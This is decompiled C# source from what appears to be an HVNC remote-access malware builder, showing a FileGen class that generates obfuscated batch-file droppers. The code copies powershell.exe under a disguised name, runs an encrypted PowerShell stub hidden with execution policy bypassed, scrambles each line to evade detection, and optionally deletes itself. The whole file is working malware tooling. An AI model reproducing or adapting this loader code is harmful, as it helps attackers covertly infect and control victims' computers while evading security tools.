using System;
using System.Text;

namespace BirdBrainmofo.HVNC.StubUtils
{
	// Token: 0x0200009F RID: 159
	public class FileGen
	{
		// Token: 0x06000834 RID: 2100 RVA: 0x00059D94 File Offset: 0x00057F94
		public static string CreateBat(byte[] key, byte[] byte_0, EncryptionMode mode, bool hidden, bool selfdelete, Random rng)
		{
			string text = StubGen.CreatePS(key, byte_0, mode, rng);
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("@echo off");
			ValueTuple<string, string> valueTuple = Obfuscator.GenCodeBat("copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", rng, 4);
			stringBuilder.AppendLine(valueTuple.Item1);
			stringBuilder.AppendLine(valueTuple.Item2 + " \"%~dp0%~nx0.exe\" /y");
			stringBuilder.AppendLine("cls");
			valueTuple = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
			stringBuilder.AppendLine(valueTuple.Item1);
			stringBuilder.AppendLine(valueTuple.Item2);
			string text2 = "-noprofile " + (hidden ? "-windowstyle hidden" : string.Empty) + " -executionpolicy bypass -command ";
			valueTuple = Obfuscator.GenCodeBat(text2, rng, 2);
			stringBuilder.AppendLine(valueTuple.Item1);
			ValueTuple<string, string> valueTuple2 = Obfuscator.GenCodeBat(text, rng, 2);
			stringBuilder.AppendLine(valueTuple2.Item1);
			stringBuilder.AppendLine("\"%~nx0.exe\" " + valueTuple.Item2 + valueTuple2.Item2);
			if (selfdelete)
			{
				stringBuilder.AppendLine("(goto) 2>nul & del \"%~f0\"");
			}
			stringBuilder.AppendLine("exit /b");
			return stringBuilder.ToString();
		}

		// Token: 0x06000835 RID: 2101 RVA: 0x00006F52 File Offset: 0x00005152
    }
}
